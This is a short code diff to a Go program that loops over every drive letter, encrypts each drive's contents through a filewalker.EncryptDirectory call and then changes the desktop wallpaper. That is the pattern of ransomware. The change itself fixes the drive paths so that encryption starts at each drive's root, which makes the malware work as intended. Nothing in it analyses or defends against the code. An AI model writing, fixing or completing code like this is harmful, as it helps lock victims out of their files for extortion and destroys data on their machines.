@@ -11,7 +11,7 @@ import (
 
 func main() {
 	for _, drive := range getDrives() {
-		filewalker.EncryptDirectory(drive + ":")
+		filewalker.EncryptDirectory(drive + ":\\")
 	}
 
 	setWallpaper()
@@ -39,7 +39,7 @@ func setWallpaper() {
 
 func getDrives() (r []string) {
 	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
-		f, err := os.Open(string(drive) + ":")
+		f, err := os.Open(string(drive) + ":\\")
 		if err == nil {
 			r = append(r, string(drive))
 			f.Close()
